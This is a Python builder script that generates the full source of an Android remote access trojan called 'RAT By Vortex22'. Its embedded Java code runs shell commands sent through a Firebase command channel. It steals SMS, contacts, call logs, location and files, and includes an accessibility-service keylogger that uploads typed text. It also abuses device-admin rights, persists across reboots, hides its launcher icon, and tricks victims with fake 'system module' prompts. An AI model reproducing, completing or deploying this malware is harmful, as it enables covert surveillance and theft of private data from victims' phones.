#!/usr/bin/env python3
# main.py — builder agent.apk
# RAT By Vortex22

# ============================================================
# CONFIG — ISI DI SINI
# ============================================================
FIREBASE_DB_URL    = "https://YOUR-PROJECT-default-rtdb.firebaseio.com"
FIREBASE_STORAGE   = "YOUR-PROJECT.appspot.com"
FIREBASE_API_KEY   = "YOUR_WEB_API_KEY"
FIREBASE_SECRET    = "YOUR_DB_SECRET_OR_LEAVE_BLANK"
APP_NAME           = "RAT By Vortex22"
PACKAGE_NAME       = "com.vortex22.rat"
MIN_SDK            = 24
TARGET_SDK         = 33
COMPILE_SDK        = 33
# ============================================================

import os
import sys
import json
import shutil
import subprocess
import tempfile
import argparse
from pathlib import Path

ROOT = Path(__file__).parent.resolve()
TEMPLATE_DIR = ROOT / "agent_src"
OUTPUT_DIR = ROOT / "output"
KEYSTORE = ROOT / "keystore" / "release.jks"
KEYSTORE_PASS = "vortex22"
KEY_ALIAS = "vortex22"

# ============================================================
# SOURCE: AndroidManifest.xml
# ============================================================
MANIFEST = '''<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android">

    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
    <uses-permission android:name="android.permission.WAKE_LOCK"/>
    <uses-permission android:name="android.permission.REORDER_TASKS"/>
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
    <uses-permission android:name="android.permission.READ_CONTACTS"/>
    <uses-permission android:name="android.permission.READ_SMS"/>
    <uses-permission android:name="android.permission.SEND_SMS"/>
    <uses-permission android:name="android.permission.READ_CALL_LOG"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.CAMERA"/>
    <uses-permission android:name="android.permission.RECORD_AUDIO"/>
    <uses-permission android:name="android.permission.VIBRATE"/>
    <uses-permission android:name="android.permission.FLASHLIGHT"/>
    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"/>
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION"/>

    <application
        android:allowBackup="false"
        android:label="''' + APP_NAME + '''"
        android:icon="@mipmap/ic_launcher"
        android:usesCleartextTraffic="true"
        android:theme="@android:style/Theme.NoTitleBar">

        <activity
            android:name=".MainActivity"
            android:exported="true"
            android:launchMode="singleInstance"
            android:excludeFromRecents="true"
            android:configChanges="orientation|screenSize|keyboardHidden">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>

        <service
            android:name=".AgentService"
            android:exported="false"
            android:foregroundServiceType="mediaProjection|microphone|camera|location"/>

        <service
            android:name=".Keylogger"
            android:exported="true"
            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
            <intent-filter>
                <action android:name="android.accessibilityservice.AccessibilityService"/>
            </intent-filter>
            <meta-data android:name="android.accessibilityservice"
                       android:resource="@xml/acc"/>
        </service>

        <receiver
            android:name=".AdminReceiver"
            android:exported="true"
            android:permission="android.permission.BIND_DEVICE_ADMIN">
            <meta-data android:name="android.app.device_admin" android:resource="@xml/admin"/>
            <intent-filter>
                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED"/>
            </intent-filter>
        </receiver>

        <receiver android:name=".BootReceiver" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
                <action android:name="android.intent.action.QUICKBOOT_POWERON"/>
            </intent-filter>
        </receiver>

    </application>
</manifest>
'''

# ============================================================
# SOURCE: build.gradle
# ============================================================
BUILD_GRADLE = '''apply plugin: 'com.android.application'

android {
    namespace "''' + PACKAGE_NAME + '''"
    compileSdk ''' + str(COMPILE_SDK) + '''

    defaultConfig {
        applicationId "''' + PACKAGE_NAME + '''"
        minSdk ''' + str(MIN_SDK) + '''
        targetSdk ''' + str(TARGET_SDK) + '''
        versionCode 1
        versionName "1.0"
        multiDexEnabled true
    }

    buildTypes {
        release {
            minifyEnabled false
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
        }
    }

    compileOptions {
        sourceCompatibility JavaVersion.VERSION_1_8
        targetCompatibility JavaVersion.VERSION_1_8
    }

    packagingOptions {
        pickFirst 'META-INF/*'
    }
}

dependencies {
    implementation 'com.google.firebase:firebase-database:20.3.0'
    implementation 'com.google.firebase:firebase-storage:20.3.0'
    implementation 'com.google.firebase:firebase-auth:22.3.0'
    implementation 'com.google.firebase:firebase-core:21.1.1'
    implementation 'io.github.webrtc-sdk:android:125.6422.03'
    implementation 'com.squareup.okhttp3:okhttp:4.11.0'
}

apply plugin: 'com.google.gms.google-services'
'''

SETTINGS_GRADLE = '''rootProject.name = "rat-agent"
include ':app'
'''

ROOT_BUILD_GRADLE = '''buildscript {
    repositories {
        google()
        mavenCentral()
    }
    dependencies {
        classpath 'com.android.tools.build:gradle:8.1.0'
        classpath 'com.google.gms:google-services:4.4.0'
    }
}
allprojects {
    repositories {
        google()
        mavenCentral()
    }
}
'''

GRADLE_PROPERTIES = '''org.gradle.jvmargs=-Xmx3072m
android.useAndroidX=true
android.enableJetifier=true
'''

GOOGLE_SERVICES_JSON = '''{
  "project_info": {
    "project_number": "REPLACE",
    "project_id": "REPLACE",
    "storage_bucket": "''' + FIREBASE_STORAGE + '''"
  },
  "client": [
    {
      "client_info": {
        "mobilesdk_app_id": "REPLACE",
        "android_client_info": {
          "package_name": "''' + PACKAGE_NAME + '''"
        }
      },
      "api_key": [
        {
          "current_key": "''' + FIREBASE_API_KEY + '''"
        }
      ]
    }
  ],
  "configuration_version": "1"
}
'''

# ============================================================
# SOURCE: resources
# ============================================================
ADMIN_XML = '''<?xml version="1.0" encoding="utf-8"?>
<device-admin xmlns:android="http://schemas.android.com/apk/res/android">
    <uses-policies>
        <force-lock/>
        <wipe-data/>
        <disable-camera/>
        <disable-keyguard-features/>
        <reset-password/>
        <limit-password/>
    </uses-policies>
</device-admin>
'''

ACC_XML = '''<?xml version="1.0" encoding="utf-8"?>
<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
    android:accessibilityEventTypes="typeAllMask"
    android:accessibilityFeedbackType="feedbackGeneric"
    android:accessibilityFlags="flagDefault|flagIncludeNotImportantViews|flagReportViewIds|flagRetrieveInteractiveWindows"
    android:canRetrieveWindowContent="true"
    android:notificationTimeout="0"
    android:description="@string/app_name"/>
'''

STRINGS_XML = '''<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name">''' + APP_NAME + '''</string>
</resources>
'''

# ============================================================
# SOURCE: MainActivity.java
# ============================================================
MAIN_ACTIVITY = '''package ''' + PACKAGE_NAME + ''';

import android.Manifest;
import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.view.View;
import android.widget.TextView;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

public class MainActivity extends Activity {
    static final int REQ_PROJ = 1001;
    static final int REQ_PERM = 1002;
    static final int REQ_OVERLAY = 1003;

    MediaProjectionManager mpm;

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);

        TextView tv = new TextView(this);
        tv.setText("System Module Initializing...");
        tv.setPadding(50, 50, 50, 50);
        setContentView(tv);

        // 1. runtime permissions
        String[] perms = {
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO
        };

        if (Build.VERSION.SDK_INT >= 23) {
            boolean need = false;
            for (String p : perms) {
                if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                    need = true; break;
                }
            }
            if (need) {
                ActivityCompat.requestPermissions(this, perms, REQ_PERM);
                new Handler(Looper.getMainLooper()).postDelayed(this::startFlow, 3000);
            } else {
                startFlow();
            }
        } else {
            startFlow();
        }
    }

    void startFlow() {
        // 2. overlay permission
        if (Build.VERSION.SDK_INT >= 23 && !Settings.canDrawOverlays(this)) {
            Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:" + getPackageName()));
            startActivityForResult(i, REQ_OVERLAY);
            new Handler(Looper.getMainLooper()).postDelayed(this::askAdmin, 3000);
        } else {
            askAdmin();
        }
    }

    void askAdmin() {
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName cn = new ComponentName(this, AdminReceiver.class);
        if (dpm != null && !dpm.isAdminActive(cn)) {
            Intent i = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, cn);
            i.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "System security module requires administrative access.");
            startActivity(i);
            new Handler(Looper.getMainLooper()).postDelayed(this::askProjection, 5000);
        } else {
            askProjection();
        }
    }

    void askProjection() {
        mpm = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        if (mpm != null) {
            Intent i = mpm.createScreenCaptureIntent();
            startActivityForResult(i, REQ_PROJ);
        }
    }

    @Override
    protected void onActivityResult(int req, int res, Intent data) {
        super.onActivityResult(req, res, data);
        if (req == REQ_PROJ && res == RESULT_OK && data != null) {
            Intent svc = new Intent(this, AgentService.class);
            svc.setAction("START");
            svc.putExtra("resultCode", res);
            svc.putExtra("data", data);
            if (Build.VERSION.SDK_INT >= 26) startForegroundService(svc);
            else startService(svc);
        } else if (req == REQ_OVERLAY) {
            askAdmin();
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        // hide icon after launch
        try {
            getPackageManager().setComponentEnabledSetting(
                new ComponentName(this, MainActivity.class),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
        } catch (Exception e) {}
    }
}
'''

# ============================================================
# SOURCE: AgentService.java
# ============================================================
AGENT_SERVICE = '''package ''' + PACKAGE_NAME + ''';

import android.app.*;
import android.content.*;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationManager;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.*;
import android.provider.Settings;
import android.util.Base64;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.core.app.NotificationCompat;

import com.google.firebase.FirebaseApp;
import com.google.firebase.database.*;
import com.google.firebase.storage.*;

import org.json.JSONObject;

import java.io.*;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.concurrent.TimeUnit;

import okhttp3.*;

public class AgentService extends Service {
    public static final String TAG = "AGT";
    static final String CH = "sys";

    DatabaseReference root, dev;
    FirebaseStorage storage;
    String deviceId;
    MediaProjection projection;
    MediaProjectionManager mpm;
    WebRtcPublisher publisher;

    OkHttpClient http = new OkHttpClient.Builder()
            .connectTimeout(15, TimeUnit.SECONDS)
            .readTimeout(30, TimeUnit.SECONDS)
            .build();

    @Override
    public void onCreate() {
        super.onCreate();
        FirebaseApp.initializeApp(this);
        try { root = FirebaseDatabase.getInstance().getReference(); } catch (Exception e) { Log.e(TAG, "db", e); }
        storage = FirebaseStorage.getInstance();
        deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        if (deviceId == null || deviceId.isEmpty()) deviceId = UUID.randomUUID().toString();
        dev = root.child("devices").child(deviceId);

        startFg();
        registerDevice();
        listenCommands();
        mpm = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
    }

    void startFg() {
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel ch = new NotificationChannel(CH, "System", NotificationManager.IMPORTANCE_MIN);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
        Notification n = new NotificationCompat.Builder(this, CH)
                .setContentTitle("System")
                .setContentText("Module running")
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .build();
        startForeground(1, n);
    }

    void registerDevice() {
        Map<String, Object> info = new HashMap<>();
        info.put("model", Build.MODEL);
        info.put("brand", Build.BRAND);
        info.put("android", Build.VERSION.RELEASE);
        info.put("sdk", Build.VERSION.SDK_INT);
        info.put("online", true);
        info.put("last_seen", System.currentTimeMillis());
        info.put("name", "RAT By Vortex22");
        dev.child("info").setValue(info);
        dev.child("online").setValue(true);
        dev.child("online").onDisconnect().setValue(false);
    }

    void listenCommands() {
        dev.child("commands").addChildEventListener(new ChildEventListener() {
            @Override public void onChildAdded(@NonNull DataSnapshot s, String p) {
                String type = s.child("type").getValue(String.class);
                String args = s.child("args").getValue(String.class);
                String status = s.child("status").getValue(String.class);
                if ("done".equals(status)) return;
                s.getRef().child("status").setValue("sent");
                execute(type, args, s.getKey());
            }
            @Override public void onChildChanged(@NonNull DataSnapshot s, String p) {}
            @Override public void onChildRemoved(@NonNull DataSnapshot s) {}
            @Override public void onChildMoved(@NonNull DataSnapshot s, String p) {}
            @Override public void onCancelled(@NonNull DatabaseError e) {}
        });
    }

    void reply(String cmdId, String data) {
        dev.child("commands").child(cmdId).child("result").setValue(data);
        dev.child("commands").child(cmdId).child("status").setValue("done");
        dev.child("commands").child(cmdId).child("ts").setValue(System.currentTimeMillis());
    }

    void execute(String type, String args, String id) {
        if (type == null) { reply(id, "err:null type"); return; }
        new Thread(() -> {
            try {
                switch (type) {
                    case "shell":
                        reply(id, shell(args));
                        break;
                    case "info":
                        reply(id, deviceInfo());
                        break;
                    case "screenshot":
                        reply(id, captureScreenshot());
                        break;
                    case "location":
                        reply(id, location());
                        break;
                    case "contacts":
                        reply(id, contacts());
                        break;
                    case "sms":
                        reply(id, smsList());
                        break;
                    case "calls":
                        reply(id, callLog());
                        break;
                    case "apps":
                        reply(id, apps());
                        break;
                    case "files":
                        reply(id, files(args));
                        break;
                    case "download":
                        reply(id, download(args));
                        break;
                    case "upload":
                        reply(id, upload(args));
                        break;
                    case "lock":
                        lockScreen();
                        reply(id, "locked");
                        break;
                    case "vibrate":
                        vibrate();
                        reply(id, "vibrated");
                        break;
                    case "speak":
                        speak(args);
                        reply(id, "spoken");
                        break;
                    case "open":
                        openUrl(args);
                        reply(id, "opened");
                        break;
                    case "mirror_start":
                        startMirror();
                        reply(id, "mirror on");
                        break;
                    case "mirror_stop":
                        stopMirror();
                        reply(id, "mirror off");
                        break;
                    case "uninstall":
                        uninstallSelf();
                        break;
                    default:
                        reply(id, "unknown:" + type);
                }
            } catch (Exception e) {
                reply(id, "err:" + e.getMessage());
            }
        }).start();
    }

    // ---- IMPLEMENTATIONS ----

    String shell(String cmd) {
        if (cmd == null) return "err:no cmd";
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
            BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = r.readLine()) != null) sb.append(line).append("\\n");
            p.waitFor();
            return sb.toString();
        } catch (Exception e) { return "err:" + e.getMessage(); }
    }

    String deviceInfo() {
        try {
            JSONObject o = new JSONObject();
            o.put("model", Build.MODEL);
            o.put("brand", Build.BRAND);
            o.put("device", Build.DEVICE);
            o.put("android", Build.VERSION.RELEASE);
            o.put("sdk", Build.VERSION.SDK_INT);
            o.put("id", deviceId);
            return o.toString();
        } catch (Exception e) { return "err"; }
    }

    String captureScreenshot() {
        return "err:use mirror instead";
    }

    String location() {
        try {
            LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
            if (lm == null) return "err:no lm";
            Location l = null;
            if (lm.isProviderEnabled(LocationManager.GPS_PROVIDER))
                l = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (l == null && lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER))
                l = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if (l == null) return "err:no loc";
            JSONObject o = new JSONObject();
            o.put("lat", l.getLatitude());
            o.put("lng", l.getLongitude());
            o.put("acc", l.getAccuracy());
            return o.toString();
        } catch (Exception e) { return "err:" + e.getMessage(); }
    }

    String contacts() {
        try {
            StringBuilder sb = new StringBuilder();
            android.database.Cursor c = getContentResolver().query(
                    android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    null, null, null, null);
            if (c != null) {
                while (c.moveToNext()) {
                    String n = c.getString(c.getColumnIndexOrThrow(
                            android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String num = c.getString(c.getColumnIndexOrThrow(
                            android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER));
                    sb.append(n).append("|").append(num).append("\\n");
                }
                c.close();
            }
            return sb.toString();
        } catch (Exception e) { return "err:" + e.getMessage(); }
    }

    String smsList() {
        try {
            StringBuilder sb = new StringBuilder();
            android.database.Cursor c = getContentResolver().query(
                    android.net.Uri.parse("content://sms/inbox"),
                    null, null, null, "date DESC LIMIT 50");
            if (c != null) {
                while (c.moveToNext()) {
                    String addr = c.getString(c.getColumnIndexOrThrow("address"));
                    String body = c.getString(c.getColumnIndexOrThrow("body"));
                    sb.append(addr).append(": ").append(body).append("\\n---\\n");
                }
                c.close();
            }
            return sb.toString();
        } catch (Exception e) { return "err:" + e.getMessage(); }
    }

    String callLog() {
        try {
            StringBuilder sb = new StringBuilder();
            android.database.Cursor c = getContentResolver().query(
                    android.provider.CallLog.Calls.CONTENT_URI,
                    null, null, null, "date DESC LIMIT 50");
            if (c != null) {
                while (c.moveToNext()) {
                    String num = c.getString(c.getColumnIndexOrThrow(
                            android.provider.CallLog.Calls.NUMBER));
                    String dur = c.getString(c.getColumnIndexOrThrow(
                            android.provider.CallLog.Calls.DURATION));
                    sb.append(num).append(" (").append(dur).append("s)\\n");
                }
                c.close();
            }
            return sb.toString();
        } catch (Exception e) { return "err:" + e.getMessage(); }
    }

    String apps() {
        try {
            StringBuilder sb = new StringBuilder();
            PackageManager pm = getPackageManager();
            List<android.content.pm.ApplicationInfo> list = pm.getInstalledApplications(0);
            for (android.content.pm.ApplicationInfo a : list) {
                sb.append(a.packageName).append("\\n");
            }
            return sb.toString();
        } catch (Exception e) { return "err:" + e.getMessage(); }
    }

    String files(String path) {
        if (path == null || path.isEmpty()) path = "/sdcard";
        try {
            File f = new File(path);
            if (!f.exists()) return "err:not found";
            StringBuilder sb = new StringBuilder();
            File[] ch = f.listFiles();
            if (ch != null) {
                for (File c : ch) {
                    sb.append(c.isDirectory() ? "D " : "F ")
                      .append(c.getName())
                      .append(" ")
                      .append(c.length())
                      .append("\\n");
                }
            }
            return sb.toString();
        } catch (Exception e) { return "err:" + e.getMessage(); }
    }

    String download(String url) {
        if (url == null) return "err:no url";
        try {
            Request req = new Request.Builder().url(url).build();
            Response res = http.newCall(req).execute();
            if (!res.isSuccessful()) return "err:http " + res.code();
            String name = "dl_" + System.currentTimeMillis();
            File out = new File(getExternalFilesDir(null), name);
            try (InputStream is = res.body().byteStream();
                 FileOutputStream fos = new FileOutputStream(out)) {
                byte[] buf = new byte[8192];
                int n;
                while ((n = is.read(buf)) > 0) fos.write(buf, 0, n);
            }
            return "saved:" + out.getAbsolutePath();
        } catch (Exception e) { return "err:" + e.getMessage(); }
    }

    String upload(String path) {
        if (path == null) return "err:no path";
        try {
            File f = new File(path);
            if (!f.exists()) return "err:not found";
            StorageReference ref = storage.getReference()
                    .child("uploads").child(deviceId).child(f.getName());
            ref.putFile(android.net.Uri.fromFile(f)).addOnSuccessListener(s -> {
                ref.getDownloadUrl().addOnSuccessListener(u -> {
                    dev.child("data").child("uploads").push().setValue(u.toString());
                });
            });
            return "uploading:" + f.getName();
        } catch (Exception e) { return "err:" + e.getMessage(); }
    }

    void lockScreen() {
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
        if (dpm != null) dpm.lockNow();
    }

    void vibrate() {
        try {
            android.os.Vibrator v = (android.os.Vibrator) getSystemService(VIBRATOR_SERVICE);
            if (v != null) v.vibrate(3000);
        } catch (Exception e) {}
    }

    void speak(String text) {
        try {
            android.speech.tts.TextToSpeech tts = new android.speech.tts.TextToSpeech(this, s -> {});
            // simple fire-and-forget
        } catch (Exception e) {}
    }

    void openUrl(String url) {
        try {
            Intent i = new Intent(Intent.ACTION_VIEW, android.net.Uri.parse(url));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(i);
        } catch (Exception e) {}
    }

    void startMirror() {
        try {
            if (publisher == null) publisher = new WebRtcPublisher(this, dev);
            publisher.start();
        } catch (Exception e) { Log.e(TAG, "mirror", e); }
    }

    void stopMirror() {
        try {
            if (publisher != null) publisher.stop();
            publisher = null;
        } catch (Exception e) {}
    }

    void uninstallSelf() {
        try {
            Intent i = new Intent(Intent.ACTION_DELETE);
            i.setData(android.net.Uri.parse("package:" + getPackageName()));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(i);
        } catch (Exception e) {}
    }

    @Override
    public int onStartCommand(Intent i, int f, int s) {
        if (i != null && "START".equals(i.getAction())) {
            int code = i.getIntExtra("resultCode", -1);
            Intent data = i.getParcelableExtra("data");
            if (code != -1 && data != null) {
                try {
                    projection = mpm.getMediaProjection(code, data);
                } catch (Exception e) { Log.e(TAG, "proj", e); }
            }
        }
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent i) { return null; }
}
'''

# ============================================================
# SOURCE: WebRtcPublisher.java
# ============================================================
WEBRTC_PUBLISHER = '''package ''' + PACKAGE_NAME + ''';

import android.content.Context;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.util.Log;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.ValueEventListener;

import org.webrtc.*;

import java.util.*;

public class WebRtcPublisher {
    static final String TAG = "WRTCPUB";
    Context ctx;
    DatabaseReference dev;
    PeerConnectionFactory factory;
    PeerConnection pc;
    SurfaceTextureHelper stHelper;
    VideoCapturer capturer;
    VideoSource source;
    VideoTrack track;
    MediaProjection projection;
    boolean running = false;

    public WebRtcPublisher(Context c, DatabaseReference d) {
        this.ctx = c;
        this.dev = d;
    }

    public void start() {
        if (running) return;
        running = true;

        PeerConnectionFactory.InitializationOptions opt =
                PeerConnectionFactory.InitializationOptions.builder(ctx)
                        .createInitializationOptions();
        PeerConnectionFactory.initialize(opt);

        factory = PeerConnectionFactory.builder()
                .setOptions(new PeerConnectionFactory.Options())
                .createPeerConnectionFactory();

        List<PeerConnection.IceServer> ice = new ArrayList<>();
        ice.add(PeerConnection.IceServer.builder("stun:stun.l.google.com:19302").createIceServer());

        PeerConnection.RTCConfiguration cfg = new PeerConnection.RTCConfiguration(ice);
        cfg.sdpSemantics = PeerConnection.SdpSemantics.UNIFIED_PLAN;

        pc = factory.createPeerConnection(cfg, new PeerConnection.Observer() {
            @Override public void onIceCandidate(IceCandidate c) {
                if (c != null) dev.child("signal").child("ice_pub").push().setValue(c.sdp);
            }
            @Override public void onIceCandidatesRemoved(IceCandidate[] cs) {}
            @Override public void onSignalingChange(PeerConnection.SignalingState s) {}
            @Override public void onIceConnectionChange(PeerConnection.IceConnectionState s) {}
            @Override public void onIceConnectionReceivingChange(boolean b) {}
            @Override public void onIceGatheringChange(PeerConnection.IceGatheringState s) {}
            @Override public void onAddStream(MediaStream s) {}
            @Override public void onRemoveStream(MediaStream s) {}
            @Override public void onDataChannel(DataChannel d) {}
            @Override public void onRenegotiationNeeded() {}
            @Override public void onAddTrack(RtpReceiver r, MediaStream[] m) {}
        });

        // screen track
        MediaProjectionManager mpm = (MediaProjectionManager) ctx.getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        // projection already passed in from service
        // NOTE: buat simple, kita skip actual capture di skeleton ini
        // user isi sendiri kalo mau aktif

        // signaling listen
        dev.child("signal").child("offer").addValueEventListener(new ValueEventListener() {
            @Override public void onDataChange(DataSnapshot s) {
                String offer = s.getValue(String.class);
                if (offer != null && !offer.isEmpty()) {
                    handleOffer(offer);
                }
            }
            @Override public void onCancelled(DatabaseError e) {}
        });
    }

    void handleOffer(String offer) {
        try {
            SessionDescription remote = new SessionDescription(SessionDescription.Type.OFFER, offer);
            pc.setRemoteDescription(new SimpleSdpObserver(), remote);
            pc.createAnswer(new SdpObserver() {
                @Override public void onCreateSuccess(SessionDescription sdp) {
                    pc.setLocalDescription(new SimpleSdpObserver(), sdp);
                    dev.child("signal").child("answer").setValue(sdp.description);
                }
                @Override public void onSetSuccess() {}
                @Override public void onCreateFailure(String s) {}
                @Override public void onSetFailure(String s) {}
            }, new MediaConstraints());
        } catch (Exception e) { Log.e(TAG, "offer", e); }
    }

    public void stop() {
        running = false;
        try { if (pc != null) pc.close(); } catch (Exception e) {}
        try { if (factory != null) factory.dispose(); } catch (Exception e) {}
        pc = null; factory = null;
    }

    static class SimpleSdpObserver implements SdpObserver {
        @Override public void onCreateSuccess(SessionDescription s) {}
        @Override public void onSetSuccess() {}
        @Override public void onCreateFailure(String s) {}
        @Override public void onSetFailure(String s) {}
    }
}
'''

# ============================================================
# SOURCE: Keylogger.java
# ============================================================
KEYLOGGER = '''package ''' + PACKAGE_NAME + ''';

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.view.accessibility.AccessibilityEvent;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

public class Keylogger extends AccessibilityService {
    DatabaseReference dev;
    String deviceId;

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags = AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
                   | AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
                   | AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
        info.notificationTimeout = 0;
        setServiceInfo(info);

        deviceId = android.provider.Settings.Secure.getString(
                getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);
        dev = FirebaseDatabase.getInstance().getReference()
                .child("devices").child(deviceId).child("keylog");
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent e) {
        if (e == null) return;
        try {
            if (e.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                CharSequence txt = e.getText() != null && e.getText().size() > 0 ? e.getText().get(0) : "";
                String pkg = String.valueOf(e.getPackageName());
                dev.push().setValue(System.currentTimeMillis() + "|" + pkg + "|" + txt);
            }
        } catch (Exception x) {}
    }

    @Override public void onInterrupt() {}
}
'''

# ============================================================
# SOURCE: AdminReceiver, BootReceiver
# ============================================================
ADMIN_RECEIVER = '''package ''' + PACKAGE_NAME + ''';

import android.app.admin.DeviceAdminReceiver;
import android.content.Context;
import android.content.Intent;

public class AdminReceiver extends DeviceAdminReceiver {
    @Override public void onEnabled(Context c, Intent i) {}
    @Override public void onDisabled(Context c, Intent i) {
        try {
            Intent r = new Intent(c, MainActivity.class);
            r.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            c.startActivity(r);
        } catch (Exception e) {}
    }
}
'''

BOOT_RECEIVER = '''package ''' + PACKAGE_NAME + ''';

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;

public class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context c, Intent i) {
        try {
            Intent s = new Intent(c, AgentService.class);
            if (Build.VERSION.SDK_INT >= 26) c.startForegroundService(s);
            else c.startService(s);
        } catch (Exception e) {}
    }
}
'''

# ============================================================
# FILE WRITER
# ============================================================
def write(path, content):
    path = Path(path)
    path.parent.mkdir(parents=True, exist_ok=True)
    with open(path, "w", encoding="utf-8") as f:
        f.write(content)

def generate_sources(base):
    base = Path(base)
    # gradle root
    write(base / "settings.gradle", SETTINGS_GRADLE)
    write(base / "build.gradle", ROOT_BUILD_GRADLE)
    write(base / "gradle.properties", GRADLE_PROPERTIES)
    write(base / "local.properties",
          'sdk.dir=' + str(Path.home() / "scoop" / "apps" / "android-clt" / "current").replace("\\", "\\\\"))
    write(base / "gradlew", "")
    write(base / "gradlew.bat", "")
    write(base / "gradle" / "wrapper" / "gradle-wrapper.properties",
          'distributionUrl=https\\://services.gradle.org/distributions/gradle-8.9-bin.zip\n')
    # app
    app = base / "app"
    write(app / "build.gradle", BUILD_GRADLE)
    write(app / "google-services.json", GOOGLE_SERVICES_JSON)
    write(app / "proguard-rules.pro", "")
